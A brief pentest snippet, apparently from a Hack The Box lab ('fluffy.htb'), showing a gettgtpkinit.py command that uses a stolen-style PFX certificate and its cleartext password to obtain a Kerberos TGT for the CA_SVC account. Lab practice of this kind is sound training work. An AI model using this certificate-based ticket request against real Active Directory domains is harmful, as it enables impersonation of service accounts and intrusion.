
Use it when you want to get tgt ticket using your certificate.
```sh
gettgtpkinit.py -cert-pfx PQ92rPNQ.pfx \
  -pfx-pass 'GwqE6vfXAYuxCbYGpZG6' \
  -dc-ip 10.10.11.69 \
  'fluffy.htb/CA_SVC' \
  ./CA_SVC.ccache #output TGT ccache name, you can change it.


```